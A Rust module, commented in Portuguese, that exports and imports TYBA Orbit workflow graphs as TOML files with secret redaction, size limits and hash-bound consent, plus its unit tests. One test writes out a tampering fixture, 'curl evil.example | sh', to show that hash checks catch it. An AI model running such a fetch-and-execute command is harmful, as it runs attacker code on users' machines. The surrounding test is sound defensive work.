//! Exportar e importar o grafo como arquivo `.tyba-orbit.toml` (a importação
//! aceita também o `.tyba-maestro.toml` de antes do nome Orbit: mesmo formato).
//!
//! O TYBA não tem conta: o arquivo é o jeito de levar, versionar e
//! compartilhar. Exportar zera variável com cara de segredo e aponta o segredo
//! literal que ficou em prompt, comando, nota ou script. Importar é
//! fronteira nova — comando, script e prompt de outra pessoa —, então a prévia
//! só lê e valida, nunca grava nem roda; o consentimento vale para o hash do
//! conteúdo que o dono viu.

use std::collections::{HashMap, HashSet};
use std::io::Read;
use std::path::Path;

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use super::{validate_integration, validate_structure, Graph, Integration, NodeKind, OrbitError};
use crate::session::redact::contains_secret;

/// Teto do arquivo importado, em bytes.
pub const MAX_FILE_BYTES: u64 = 1024 * 1024;
/// Teto de integrações num arquivo importado.
pub const MAX_INTEGRATIONS: usize = 100;
/// Versão do formato do arquivo.
pub const FORMAT_VERSION: u32 = 1;

#[derive(Debug, thiserror::Error)]
pub enum ExportError {
    #[error("{0}")]
    Invalid(#[from] OrbitError),
    #[error("o grafo usa integração inexistente: {0}")]
    MissingIntegration(String),
    #[error("arquivo passa do teto de 1 MB")]
    FileTooLarge,
    #[error("arquivo com {0} integrações passa do teto de {MAX_INTEGRATIONS}")]
    TooManyIntegrations(usize),
    #[error("integração repetida no arquivo: {0}")]
    DuplicateIntegration(String),
    #[error("versão do arquivo não suportada: {0}")]
    UnsupportedVersion(u32),
    #[error("o arquivo mudou desde a prévia: revise de novo antes de confirmar")]
    HashMismatch,
    #[error("arquivo inválido: {0}")]
    Parse(String),
    #[error("pasta de destino inválida: {0}")]
    InvalidDir(String),
    #[error("nó {node}: a pasta {dir} não existe nesta máquina — escolha uma antes de confirmar")]
    MissingDir { node: String, dir: String },
    #[error("pasta escolhida para nó que não roda ou não existe no arquivo: {0}")]
    UnknownDirNode(String),
    #[error("falha ao gerar o arquivo: {0}")]
    Serialize(String),
    #[error("{0}")]
    Io(#[from] std::io::Error),
}

/// Conteúdo do `.tyba-orbit.toml`: o grafo inteiro e as integrações que ele
/// usa.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct OrbitFile {
    version: u32,
    graph: Graph,
    #[serde(default)]
    integrations: Vec<Integration>,
}

/// Arquivo lido e validado, ainda não gravado. `hash` é o SHA-256 dos bytes
/// do arquivo: é por ele que o dono consente.
#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Imported {
    pub hash: String,
    /// Grafo inteiro: comandos, prompts, variáveis e a pasta de cada nó (a de
    /// quem exportou; a que não existe aqui o dono escolhe antes de confirmar).
    pub graph: Graph,
    /// Integrações do arquivo, com o script inteiro.
    pub integrations: Vec<Integration>,
}

/// O que a tela de importação mostra antes do Confirmar.
#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ImportPreview {
    #[serde(flatten)]
    pub imported: Imported,
    /// Já existe um grafo com esse id: confirmar substitui.
    pub replaces_graph: bool,
    /// Integrações do arquivo cujo id já existe aqui com outro conteúdo:
    /// entram com id novo e a local fica como está.
    pub renamed_integrations: Vec<String>,
    /// A pasta de cada nó executável e se ela existe nesta máquina.
    pub dirs: Vec<ImportDir>,
}

/// Pasta de um nó do arquivo importado.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ImportDir {
    pub node_id: String,
    /// A do nó ou, sem ela, a padrão do grafo — como veio no arquivo.
    pub dir: String,
    /// É uma pasta (absoluta) desta máquina.
    pub exists: bool,
}

fn existing_dir(dir: &str) -> bool {
    let path = Path::new(dir);
    path.is_absolute() && path.is_dir()
}

/// A pasta de cada nó executável do arquivo, marcando a que não existe aqui.
pub fn import_dirs(graph: &Graph) -> Vec<ImportDir> {
    graph
        .nodes
        .iter()
        .filter(|n| n.kind.dir().is_some())
        .map(|n| {
            let dir = graph.node_dir(n).to_string();
            ImportDir {
                node_id: n.id.clone(),
                exists: existing_dir(&dir),
                dir,
            }
        })
        .collect()
}

/// De quem é o campo com cara de segredo.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum SecretOwner {
    Node,
    Integration,
}

/// Campo que saiu no arquivo com algo que parece segredo literal. O texto do
/// dono não é reescrito (zerar um script quebra o script): o front avisa.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SecretField {
    pub owner: SecretOwner,
    pub id: String,
    /// Título do nó ou nome da integração.
    pub name: String,
    /// `prompt`, `command`, `markdown` ou `script`.
    pub field: String,
}

/// O que o front avisa depois de exportar.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ExportReport {
    /// Variáveis que saíram vazias por parecerem segredo.
    pub cleared: Vec<String>,
    /// Campos que saíram com segredo literal dentro.
    pub secret_fields: Vec<SecretField>,
}

fn secret_fields(graph: &Graph, integrations: &[Integration]) -> Vec<SecretField> {
    let mut found = Vec::new();
    let mut check = |owner, id: &str, name: &str, field: &str, text: &str| {
        if contains_secret(text) {
            found.push(SecretField {
                owner,
                id: id.to_string(),
                name: name.to_string(),
                field: field.to_string(),
            });
        }
    };
    for node in &graph.nodes {
        let (field, text) = match &node.kind {
            NodeKind::Agent { prompt, .. } => ("prompt", prompt),
            NodeKind::Process { command, .. } => ("command", command),
            NodeKind::Note { markdown } => ("markdown", markdown),
            NodeKind::Browser { url } => ("url", url),
            NodeKind::Integration { .. } | NodeKind::Service { .. } => continue,
        };
        check(SecretOwner::Node, &node.id, &node.title, field, text);
    }
    for integration in integrations {
        check(
            SecretOwner::Integration,
            &integration.id,
            &integration.name,
            "script",
            &integration.script,
        );
    }
    found
}

/// Gera o TOML do grafo com as integrações que ele usa. Devolve também o que
/// o front avisa: variáveis zeradas e campos com segredo literal.
pub fn export_toml(
    graph: &Graph,
    integrations: &[Integration],
) -> Result<(String, ExportReport), ExportError> {
    let mut graph = graph.clone();
    // Cada nó sai com a própria pasta, mesmo o que herdava a padrão.
    let fallback = graph.dir.clone();
    for node in graph.nodes.iter_mut() {
        if let Some(dir) = node.kind.dir_mut() {
            if dir.is_empty() {
                dir.clone_from(&fallback);
            }
        }
    }
    let mut cleared = Vec::new();
    for (name, value) in graph.variables.iter_mut() {
        if contains_secret(name) || contains_secret(value) {
            value.clear();
            cleared.push(name.clone());
        }
    }

    let mut used: Vec<Integration> = Vec::new();
    for node in &graph.nodes {
        if let NodeKind::Integration { integration_id, .. } = &node.kind {
            if used.iter().any(|i| &i.id == integration_id) {
                continue;
            }
            let integration = integrations
                .iter()
                .find(|i| &i.id == integration_id)
                .ok_or_else(|| ExportError::MissingIntegration(integration_id.clone()))?;
            used.push(integration.clone());
        }
    }

    let report = ExportReport {
        cleared,
        secret_fields: secret_fields(&graph, &used),
    };
    let file = OrbitFile {
        version: FORMAT_VERSION,
        graph,
        integrations: used,
    };
    let text = toml::to_string_pretty(&file).map_err(|e| ExportError::Serialize(e.to_string()))?;
    Ok((text, report))
}

/// Exporta para `path`. Devolve o que o front avisa.
pub fn export_to(
    path: &Path,
    graph: &Graph,
    integrations: &[Integration],
) -> Result<ExportReport, ExportError> {
    let (text, report) = export_toml(graph, integrations)?;
    std::fs::write(path, text)?;
    Ok(report)
}

fn sha256_hex(bytes: &[u8]) -> String {
    format!("{:x}", Sha256::digest(bytes))
}

/// Lê os bytes, parseia e valida (B1 + tetos de security). Não grava nada.
pub fn parse_import(bytes: &[u8]) -> Result<Imported, ExportError> {
    if bytes.len() as u64 > MAX_FILE_BYTES {
        return Err(ExportError::FileTooLarge);
    }
    let hash = sha256_hex(bytes);
    let text = std::str::from_utf8(bytes).map_err(|e| ExportError::Parse(e.to_string()))?;
    let file: OrbitFile = toml::from_str(text).map_err(|e| ExportError::Parse(e.to_string()))?;
    if file.version != FORMAT_VERSION {
        return Err(ExportError::UnsupportedVersion(file.version));
    }
    if file.integrations.len() > MAX_INTEGRATIONS {
        return Err(ExportError::TooManyIntegrations(file.integrations.len()));
    }
    let mut ids = HashSet::new();
    for integration in &file.integrations {
        if !ids.insert(integration.id.as_str()) {
            return Err(ExportError::DuplicateIntegration(integration.id.clone()));
        }
        validate_integration(integration)?;
    }
    // O grafo só enxerga as integrações do próprio arquivo: o que roda é o que
    // está na prévia, não o que por acaso já existe no TYBA do dono. A pasta
    // é de outra máquina: só se confere no Confirmar, depois da escolha.
    validate_structure(&file.graph, &file.integrations)?;
    Ok(Imported {
        hash,
        graph: file.graph,
        integrations: file.integrations,
    })
}

/// Lê o arquivo sem passar do teto (nunca carrega mais que 1 MB + 1 byte).
pub fn read_import(path: &Path) -> Result<Imported, ExportError> {
    let mut bytes = Vec::new();
    std::fs::File::open(path)?
        .take(MAX_FILE_BYTES + 1)
        .read_to_end(&mut bytes)?;
    parse_import(&bytes)
}

/// Põe cada nó executável numa pasta que existe nesta máquina: a escolhida
/// pelo dono em `chosen` (id do nó → pasta) ou, sem escolha, a do arquivo se
/// ela existe aqui. Pasta inexistente sem escolha recusa — nada é gravado com
/// pasta que não existe. `default_dir` vira a pasta padrão do grafo.
pub fn place_dirs(
    imported: &mut Imported,
    default_dir: &str,
    chosen: &HashMap<String, String>,
) -> Result<(), ExportError> {
    if !existing_dir(default_dir) {
        return Err(ExportError::InvalidDir(default_dir.to_string()));
    }
    let graph = &mut imported.graph;
    for id in chosen.keys() {
        if !graph
            .nodes
            .iter()
            .any(|n| &n.id == id && n.kind.dir().is_some())
        {
            return Err(ExportError::UnknownDirNode(id.clone()));
        }
    }
    let mut placed = Vec::new();
    for node in &graph.nodes {
        if node.kind.dir().is_none() {
            continue;
        }
        let dir = match chosen.get(&node.id) {
            Some(dir) if existing_dir(dir) => dir.clone(),
            Some(dir) => return Err(ExportError::InvalidDir(dir.clone())),
            None => {
                let dir = graph.node_dir(node);
                if !existing_dir(dir) {
                    return Err(ExportError::MissingDir {
                        node: node.id.clone(),
                        dir: dir.to_string(),
                    });
                }
                dir.to_string()
            }
        };
        placed.push(dir);
    }
    let mut placed = placed.into_iter();
    for node in graph.nodes.iter_mut() {
        if let Some(dir) = node.kind.dir_mut() {
            *dir = placed.next().expect("uma pasta por nó executável");
        }
    }
    graph.dir = default_dir.to_string();
    Ok(())
}

/// Resultado de `resolve_integration_ids`.
#[derive(Debug, Clone, PartialEq)]
pub struct Resolved {
    /// O que o Confirmar grava: integrações novas e as renomeadas.
    pub to_save: Vec<Integration>,
    /// Ids do arquivo que colidiram com integração local de outro conteúdo.
    pub renamed: Vec<String>,
}

/// Integração do arquivo cujo id já existe aqui com outro conteúdo ganha id
/// novo, e os nós do grafo importado passam a apontar para ele: importar nunca
/// troca o script de uma integração local (que outro grafo, já consentido,
/// usa). Mesmo id e mesmo conteúdo: a local fica como está e não é regravada.
pub fn resolve_integration_ids<E>(
    imported: &mut Imported,
    mut local: impl FnMut(&str) -> Result<Option<Integration>, E>,
    mut new_id: impl FnMut() -> String,
) -> Result<Resolved, E> {
    let mut resolved = Resolved {
        to_save: Vec::new(),
        renamed: Vec::new(),
    };
    for integration in imported.integrations.iter_mut() {
        match local(&integration.id)? {
            None => resolved.to_save.push(integration.clone()),
            Some(existing) if existing == *integration => {}
            Some(_) => {
                let old = std::mem::replace(&mut integration.id, new_id());
                for node in imported.graph.nodes.iter_mut() {
                    if let NodeKind::Integration { integration_id, .. } = &mut node.kind {
                        if *integration_id == old {
                            integration_id.clone_from(&integration.id);
                        }
                    }
                }
                resolved.renamed.push(old);
                resolved.to_save.push(integration.clone());
            }
        }
    }
    Ok(resolved)
}

/// Relê para o Confirmar: o hash tem que ser o mesmo que o dono viu na prévia.
pub fn read_confirmed(path: &Path, hash: &str) -> Result<Imported, ExportError> {
    let imported = read_import(path)?;
    if imported.hash != hash {
        return Err(ExportError::HashMismatch);
    }
    Ok(imported)
}

#[cfg(test)]
mod tests {
    use std::collections::BTreeMap;

    use super::*;
    use crate::orbit::{
        validate_graph, Edge, EdgeKind, Node, OutputKind, Position, Runner, Size, Trigger,
    };

    fn node(id: &str, kind: NodeKind) -> Node {
        Node {
            id: id.into(),
            title: format!("nó {id}"),
            kind,
            position: Position { x: 10.5, y: -20.0 },
            size: Size { w: 320.0, h: 200.0 },
        }
    }

    fn integration() -> Integration {
        Integration {
            id: "i-1".into(),
            name: "avisar".into(),
            script: "#!/bin/bash\ncat \"$TYBA_IN/log.txt\" | wc -l > \"$TYBA_OUT/out.json\"\n"
                .into(),
            trigger: Trigger::OnInput {
                kind: EdgeKind::Log,
            },
            output: OutputKind::Json,
            file: None,
        }
    }

    fn sample() -> (Graph, Vec<Integration>) {
        let mut variables = BTreeMap::new();
        variables.insert("alvo".into(), "main".into());
        let graph = Graph {
            id: "g-1".into(),
            name: "revisão".into(),
            dir: "/tmp/repo".into(),
            nodes: vec![
                node(
                    "a",
                    NodeKind::Agent {
                        runner: Runner::Claude,
                        role: "revisor".into(),
                        prompt: "revise o diff contra {{alvo}}".into(),
                        dir: "/tmp/repo".into(),
                        orchestrate: true,
                    },
                ),
                node(
                    "p",
                    NodeKind::Process {
                        command: "cargo test".into(),
                        output: OutputKind::Log,
                        file: None,
                        dir: "/tmp/repo".into(),
                    },
                ),
                node(
                    "i",
                    NodeKind::Integration {
                        integration_id: "i-1".into(),
                        dir: "/tmp/repo".into(),
                    },
                ),
                node(
                    "n",
                    NodeKind::Note {
                        markdown: "# plano\n\n- passo".into(),
                    },
                ),
            ],
            edges: vec![
                Edge {
                    id: "e1".into(),
                    from: "a".into(),
                    to: "p".into(),
                    kind: EdgeKind::Diff,
                },
                Edge {
                    id: "e2".into(),
                    from: "p".into(),
                    to: "i".into(),
                    kind: EdgeKind::Log,
                },
            ],
            variables,
        };
        // Uma integração que o grafo não usa não vai para o arquivo.
        let mut unused = integration();
        unused.id = "i-sobra".into();
        (graph, vec![unused, integration()])
    }

    #[test]
    fn round_trip_keeps_graph_and_integrations() {
        let (graph, integrations) = sample();
        let (text, report) = export_toml(&graph, &integrations).unwrap();
        assert_eq!(report, ExportReport::default());
        let imported = parse_import(text.as_bytes()).unwrap();
        assert_eq!(imported.graph, graph);
        assert_eq!(imported.integrations, vec![integration()]);
        assert_eq!(imported.hash, sha256_hex(text.as_bytes()));
    }

    /// O orquestrador viaja no arquivo e volta na prévia: quem importa vê que
    /// o nó vai ganhar as ferramentas do Orbit.
    #[test]
    fn orchestrate_flag_travels_in_the_file() {
        let (graph, integrations) = sample();
        let (text, _) = export_toml(&graph, &integrations).unwrap();
        assert!(text.contains("orchestrate = true"), "{text}");
        let imported = parse_import(text.as_bytes()).unwrap();
        assert!(matches!(
            imported.graph.nodes[0].kind,
            NodeKind::Agent {
                orchestrate: true,
                ..
            }
        ));
        // Arquivo de antes do orquestrador: agente que não orquestra.
        let old = text.replace("orchestrate = true\n", "");
        assert!(!old.contains("orchestrate"));
        let imported = parse_import(old.as_bytes()).unwrap();
        assert!(matches!(
            imported.graph.nodes[0].kind,
            NodeKind::Agent {
                orchestrate: false,
                ..
            }
        ));
    }

    #[test]
    fn round_trip_keeps_browser_and_service() {
        use crate::orbit::ServiceSource;
        let (mut graph, integrations) = sample();
        graph.nodes.extend([
            node(
                "s",
                NodeKind::Service {
                    source: ServiceSource::Container {
                        container_id: "abc123def456".into(),
                        name: "api".into(),
                    },
                },
            ),
            node(
                "t",
                NodeKind::Service {
                    source: ServiceSource::Port {
                        session_id: None,
                        port: 5173,
                    },
                },
            ),
            node(
                "b",
                NodeKind::Browser {
                    url: "http://localhost:5173/agenda".into(),
                },
            ),
        ]);
        graph.edges.push(Edge {
            id: "e3".into(),
            from: "s".into(),
            to: "b".into(),
            kind: EdgeKind::Url,
        });
        let (text, _) = export_toml(&graph, &integrations).unwrap();
        let imported = parse_import(text.as_bytes()).unwrap();
        assert_eq!(imported.graph, graph);
        // Navegador e serviço não têm pasta: não entram na escolha de pastas.
        assert!(import_dirs(&imported.graph)
            .iter()
            .all(|d| !["s", "t", "b"].contains(&d.node_id.as_str())));

        // URL não local no arquivo é recusada já na prévia.
        let bad = text.replace("http://localhost:5173/agenda", "https://example.com");
        assert!(parse_import(bad.as_bytes()).is_err());
    }

    #[test]
    fn round_trip_keeps_plan_and_control_edges() {
        let (mut graph, integrations) = sample();
        graph.nodes.push(node(
            "b",
            NodeKind::Browser {
                url: "https://code.muriki.test".into(),
            },
        ));
        graph.edges.extend([
            Edge {
                id: "e3".into(),
                from: "a".into(),
                to: "n".into(),
                kind: EdgeKind::Plan,
            },
            Edge {
                id: "e4".into(),
                from: "a".into(),
                to: "b".into(),
                kind: EdgeKind::Control,
            },
        ]);
        let (text, _) = export_toml(&graph, &integrations).unwrap();
        assert!(text.contains("kind = \"plan\""), "{text}");
        assert!(text.contains("kind = \"control\""), "{text}");
        let imported = parse_import(text.as_bytes()).unwrap();
        assert_eq!(imported.graph, graph);
        // Ligação fora da regra no arquivo é recusada já na prévia.
        let bad = text.replace("kind = \"control\"", "kind = \"plan\"");
        assert!(parse_import(bad.as_bytes()).is_err());
    }

    #[test]
    fn secret_variable_is_cleared_on_export() {
        let (mut graph, integrations) = sample();
        // Fixture sintética, não é chave de ninguém.
        graph
            .variables
            .insert("API_KEY".into(), "sk-FAKEfakeFAKEfakeFAKEfake0000".into());
        let (text, report) = export_toml(&graph, &integrations).unwrap();
        assert_eq!(report.cleared, vec!["API_KEY".to_string()]);
        assert!(!text.contains("sk-FAKE"));
        let imported = parse_import(text.as_bytes()).unwrap();
        assert_eq!(imported.graph.variables["API_KEY"], "");
        assert_eq!(imported.graph.variables["alvo"], "main");
    }

    #[test]
    fn literal_secret_in_text_fields_is_reported_on_export() {
        let (mut graph, mut integrations) = sample();
        // Fixtures sintéticas, não são chave de ninguém.
        let fake = "sk-FAKEfakeFAKEfakeFAKEfake0000";
        for node in graph.nodes.iter_mut() {
            match &mut node.kind {
                NodeKind::Agent { prompt, .. } => prompt.push_str(&format!(" use {fake}")),
                NodeKind::Process { command, .. } => {
                    *command = "curl -H 'Authorization: Bearer x' AKIAFAKEFAKEFAKEFAKE".into()
                }
                _ => {}
            }
        }
        for i in integrations.iter_mut() {
            i.script = format!("export TOKEN={fake}\n");
        }
        let (text, report) = export_toml(&graph, &integrations).unwrap();
        assert!(report.cleared.is_empty());
        // O texto do dono não é reescrito: sai como está, com aviso.
        assert!(text.contains(fake));
        let found: Vec<(SecretOwner, &str, &str)> = report
            .secret_fields
            .iter()
            .map(|f| (f.owner, f.id.as_str(), f.field.as_str()))
            .collect();
        assert_eq!(
            found,
            vec![
                (SecretOwner::Node, "a", "prompt"),
                (SecretOwner::Node, "p", "command"),
                // Só a integração que o grafo usa vai para o arquivo.
                (SecretOwner::Integration, "i-1", "script"),
            ]
        );
        assert_eq!(report.secret_fields[0].name, "nó a");
    }

    #[test]
    fn import_never_overwrites_local_integration_with_other_content() {
        let (graph, integrations) = sample();
        let (text, _) = export_toml(&graph, &integrations).unwrap();
        let mut imported = parse_import(text.as_bytes()).unwrap();

        // Aqui já existe uma "i-1" com outro script, usada por outro grafo.
        let mut mine = integration();
        mine.script = "echo meu script consentido".into();
        let local = |id: &str| -> Result<Option<Integration>, ()> {
            Ok((id == "i-1").then(|| mine.clone()))
        };
        let resolved = resolve_integration_ids(&mut imported, local, || "novo".into()).unwrap();
        assert_eq!(resolved.renamed, vec!["i-1".to_string()]);
        assert_eq!(resolved.to_save.len(), 1);
        assert_eq!(resolved.to_save[0].id, "novo");
        assert_eq!(resolved.to_save[0].script, integration().script);
        assert!(!resolved.to_save.iter().any(|i| i.id == "i-1"));
        // O grafo importado aponta para a cópia nova e continua válido.
        let node = imported.graph.nodes.iter().find(|n| n.id == "i").unwrap();
        assert_eq!(
            node.kind,
            NodeKind::Integration {
                integration_id: "novo".into(),
                dir: "/tmp/repo".into(),
            }
        );
        validate_graph(&imported.graph, &imported.integrations).unwrap();

        // Mesmo id e mesmo conteúdo: nada a gravar, nada renomeado.
        let mut again = parse_import(text.as_bytes()).unwrap();
        let same = |_: &str| -> Result<Option<Integration>, ()> { Ok(Some(integration())) };
        let resolved = resolve_integration_ids(&mut again, same, || unreachable!()).unwrap();
        assert_eq!(resolved.to_save, vec![]);
        assert!(resolved.renamed.is_empty());

        // Id novo aqui: grava como veio.
        let mut fresh = parse_import(text.as_bytes()).unwrap();
        let none = |_: &str| -> Result<Option<Integration>, ()> { Ok(None) };
        let resolved = resolve_integration_ids(&mut fresh, none, || unreachable!()).unwrap();
        assert_eq!(resolved.to_save, vec![integration()]);
    }

    #[test]
    fn export_carries_each_node_dir() {
        let (mut graph, integrations) = sample();
        // Nó salvo antes da pasta por nó: sai com a pasta padrão do grafo.
        if let Some(dir) = graph.nodes[1].kind.dir_mut() {
            dir.clear();
        }
        if let Some(dir) = graph.nodes[0].kind.dir_mut() {
            *dir = "/tmp/outra".into();
        }
        let (text, _) = export_toml(&graph, &integrations).unwrap();
        let imported = parse_import(text.as_bytes()).unwrap();
        let dirs: Vec<(&str, Option<&str>)> = imported
            .graph
            .nodes
            .iter()
            .map(|n| (n.id.as_str(), n.kind.dir()))
            .collect();
        assert_eq!(
            dirs,
            vec![
                ("a", Some("/tmp/outra")),
                ("p", Some("/tmp/repo")),
                ("i", Some("/tmp/repo")),
                ("n", None),
            ]
        );
    }

    #[test]
    fn import_lists_each_node_dir_and_marks_missing() {
        let (mut graph, integrations) = sample();
        let here = tempfile::tempdir().unwrap();
        let here_str = here.path().to_str().unwrap().to_string();
        if let Some(dir) = graph.nodes[0].kind.dir_mut() {
            dir.clone_from(&here_str);
        }
        if let Some(dir) = graph.nodes[1].kind.dir_mut() {
            *dir = "/nao/existe/tyba-orbit-teste".into();
        }
        if let Some(dir) = graph.nodes[2].kind.dir_mut() {
            *dir = "relativa".into();
        }
        let (text, _) = export_toml(&graph, &integrations).unwrap();
        let imported = parse_import(text.as_bytes()).unwrap();
        assert_eq!(
            import_dirs(&imported.graph),
            vec![
                ImportDir {
                    node_id: "a".into(),
                    dir: here_str,
                    exists: true
                },
                ImportDir {
                    node_id: "p".into(),
                    dir: "/nao/existe/tyba-orbit-teste".into(),
                    exists: false
                },
                ImportDir {
                    node_id: "i".into(),
                    dir: "relativa".into(),
                    exists: false
                },
            ]
        );
    }

    #[test]
    fn import_with_missing_dir_is_refused_without_mapping() {
        let (mut graph, integrations) = sample();
        let here = tempfile::tempdir().unwrap();
        let here_str = here.path().to_str().unwrap().to_string();
        let other = tempfile::tempdir().unwrap();
        let other_str = other.path().to_str().unwrap().to_string();
        let missing = "/nao/existe/tyba-orbit-teste";
        for node in graph.nodes.iter_mut() {
            if let Some(dir) = node.kind.dir_mut() {
                *dir = if node.id == "p" {
                    missing.into()
                } else {
                    here_str.clone()
                };
            }
        }
        let (text, _) = export_toml(&graph, &integrations).unwrap();
        let imported = parse_import(text.as_bytes()).unwrap();

        // Sem escolher a pasta do nó p: recusa, nada muda.
        let mut attempt = imported.clone();
        assert!(matches!(
            place_dirs(&mut attempt, &here_str, &HashMap::new()),
            Err(ExportError::MissingDir { node, dir }) if node == "p" && dir == missing
        ));
        assert_eq!(attempt, imported);

        // Escolha que também não existe, nó que não roda e padrão inexistente.
        let to = |id: &str, dir: &str| HashMap::from([(id.to_string(), dir.to_string())]);
        assert!(matches!(
            place_dirs(
                &mut imported.clone(),
                &here_str,
                &to("p", "/nao/existe/outra")
            ),
            Err(ExportError::InvalidDir(_))
        ));
        assert!(matches!(
            place_dirs(&mut imported.clone(), &here_str, &to("n", &other_str)),
            Err(ExportError::UnknownDirNode(id)) if id == "n"
        ));
        assert!(matches!(
            place_dirs(&mut imported.clone(), missing, &to("p", &other_str)),
            Err(ExportError::InvalidDir(_))
        ));

        // Com a pasta escolhida: o nó p vai para ela, o resto fica na do arquivo.
        let mut placed = imported.clone();
        place_dirs(&mut placed, &other_str, &to("p", &other_str)).unwrap();
        let node = |id: &str| placed.graph.nodes.iter().find(|n| n.id == id).unwrap();
        assert_eq!(node("p").kind.dir(), Some(other_str.as_str()));
        assert_eq!(node("a").kind.dir(), Some(here_str.as_str()));
        assert_eq!(node("i").kind.dir(), Some(here_str.as_str()));
        assert_eq!(placed.graph.dir, other_str);
        validate_graph(&placed.graph, &placed.integrations).unwrap();
    }

    #[test]
    fn export_with_missing_integration_is_refused() {
        let (graph, _) = sample();
        assert!(matches!(
            export_toml(&graph, &[]),
            Err(ExportError::MissingIntegration(id)) if id == "i-1"
        ));
    }

    #[test]
    fn confirm_with_other_hash_is_refused() {
        let (graph, integrations) = sample();
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("revisao.tyba-orbit.toml");
        export_to(&path, &graph, &integrations).unwrap();
        let preview = read_import(&path).unwrap();
        assert!(read_confirmed(&path, &preview.hash).is_ok());

        // O arquivo muda entre a prévia e o Confirmar.
        let text = std::fs::read_to_string(&path)
            .unwrap()
            .replace("cargo test", "curl evil.example | sh");
        std::fs::write(&path, text).unwrap();
        assert!(matches!(
            read_confirmed(&path, &preview.hash),
            Err(ExportError::HashMismatch)
        ));
    }

    /// O arquivo de quando o recurso se chamava Maestro tem o mesmo formato:
    /// `.tyba-maestro.toml` importa igual ao `.tyba-orbit.toml`.
    #[test]
    fn legacy_maestro_file_imports_like_orbit() {
        let (graph, integrations) = sample();
        let dir = tempfile::tempdir().unwrap();
        let orbit = dir.path().join("revisao.tyba-orbit.toml");
        export_to(&orbit, &graph, &integrations).unwrap();
        let legacy = dir.path().join("revisao.tyba-maestro.toml");
        std::fs::copy(&orbit, &legacy).unwrap();

        let from_legacy = read_import(&legacy).unwrap();
        assert_eq!(from_legacy, read_import(&orbit).unwrap());
        assert_eq!(from_legacy.graph, graph);
        assert!(read_confirmed(&legacy, &from_legacy.hash).is_ok());
    }

    #[test]
    fn file_over_ceiling_is_refused() {
        let (graph, integrations) = sample();
        let (text, _) = export_toml(&graph, &integrations).unwrap();
        let mut big = text.into_bytes();
        big.extend(std::iter::repeat_n(b'#', MAX_FILE_BYTES as usize));
        assert!(matches!(parse_import(&big), Err(ExportError::FileTooLarge)));

        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("grande.tyba-orbit.toml");
        std::fs::write(&path, &big).unwrap();
        assert!(matches!(read_import(&path), Err(ExportError::FileTooLarge)));
    }

    #[test]
    fn control_chars_are_refused_on_import() {
        let (graph, integrations) = sample();
        let (text, _) = export_toml(&graph, &integrations).unwrap();
        // TOML aceita o escape; a validação do core recusa o caractere.
        let bad = text.replace("cargo test", "cargo test\\u001b[2J");
        assert_ne!(bad, text);
        assert!(matches!(
            parse_import(bad.as_bytes()),
            Err(ExportError::Invalid(OrbitError::ControlChars(_)))
        ));
    }

    #[test]
    fn integration_ceiling_and_duplicates_are_refused() {
        let (graph, _) = sample();
        let many: Vec<Integration> = (0..=MAX_INTEGRATIONS)
            .map(|n| {
                let mut i = integration();
                i.id = format!("i-{n}");
                i
            })
            .collect();
        let file = OrbitFile {
            version: FORMAT_VERSION,
            graph: graph.clone(),
            integrations: many,
        };
        let text = toml::to_string(&file).unwrap();
        assert!(matches!(
            parse_import(text.as_bytes()),
            Err(ExportError::TooManyIntegrations(n)) if n == MAX_INTEGRATIONS + 1
        ));

        let file = OrbitFile {
            version: FORMAT_VERSION,
            graph,
            integrations: vec![integration(), integration()],
        };
        let text = toml::to_string(&file).unwrap();
        assert!(matches!(
            parse_import(text.as_bytes()),
            Err(ExportError::DuplicateIntegration(id)) if id == "i-1"
        ));
    }

    #[test]
    fn graph_only_sees_integrations_from_the_file() {
        let (graph, _) = sample();
        let file = OrbitFile {
            version: FORMAT_VERSION,
            graph,
            integrations: vec![],
        };
        let text = toml::to_string(&file).unwrap();
        assert!(matches!(
            parse_import(text.as_bytes()),
            Err(ExportError::Invalid(OrbitError::UnknownIntegration { .. }))
        ));
    }

    #[test]
    fn unknown_version_is_refused() {
        let (graph, integrations) = sample();
        let (text, _) = export_toml(&graph, &integrations).unwrap();
        let bad = text.replacen("version = 1", "version = 2", 1);
        assert!(matches!(
            parse_import(bad.as_bytes()),
            Err(ExportError::UnsupportedVersion(2))
        ));
    }
}
